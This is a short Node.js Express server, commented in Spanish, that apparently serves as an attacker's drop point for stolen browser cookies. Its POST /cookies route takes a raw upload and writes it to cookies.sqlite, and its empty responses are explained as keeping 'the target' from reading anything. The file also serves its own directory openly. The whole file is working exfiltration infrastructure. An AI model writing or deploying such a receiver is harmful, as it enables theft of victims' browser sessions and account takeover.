const express = require('express');
const rawBody = require('raw-body');
const fs = require('fs');

const app = express();
const IP = '192.168.1.50';
const PORT = 4321;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.listen(PORT, IP, () => {
  console.log(`Servidor corriendo en http://${IP}:${PORT}`);
});

app.post('/cookies', (req, res) => {
  rawBody(
    req,
    {
      length: req.headers['content-length'],
      limit: '10mb',
      encoding: true // datos como Buffer
    },
    (err, body) => {
      if (err) {
        console.error(err);
        res.status(400).send(''); // No enviamos nada para que el target no pueda leerlo
        return;
      }

      const data = Buffer.from(body, 'binary');
      fs.writeFile(`./cookies.sqlite`, data, (err) => {
        if (err) {
          console.error(err);
          res.status(500).send(''); // No enviamos nada para que el target no pueda leerlo
          return;
        }

        console.log('Cookie recibida');
        res.status(200).send(''); // No enviamos nada para que el target no pueda leerlo
      });
    }
  );
});

app.use(express.static(__dirname)); // así se tiene acceso a cualquier fichero del servidor
